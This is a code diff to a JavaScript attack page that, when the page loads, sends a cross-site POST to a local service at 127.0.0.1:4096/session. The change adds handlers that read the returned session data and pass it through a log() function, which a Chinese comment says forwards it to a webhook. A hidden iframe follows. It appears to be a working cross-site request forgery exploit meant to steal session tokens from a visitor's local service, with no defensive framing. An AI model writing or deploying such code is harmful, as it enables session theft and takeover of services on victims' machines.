@@ -16,12 +16,20 @@ window.onload = () => {
 
 var xhr = new XMLHttpRequest();
 xhr.open('POST', 'http://127.0.0.1:4096/session');
-xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0');
-xhr.setRequestHeader('Connection', 'close');
 xhr.setRequestHeader('Content-Type', 'application/json');
-xhr.setRequestHeader('Accept-Encoding', 'gzip, deflate');
+xhr.onload = function() {
+    if (xhr.status === 200) {
+        // 假设服务器返回的响应体里包含 session 字段
+        var response = xhr.responseText;
+        log('session=' + encodeURIComponent(response)); // 发送到 webhook
+    } else {
+        log('error-status=' + xhr.status);
+    }
+};
+xhr.onerror = function() {
+    log('request-failed');
+};
 xhr.send('{}');
-log('csrf-start-sent');
 
   const f2 = document.createElement('iframe');
   f2.style.display = 'none';
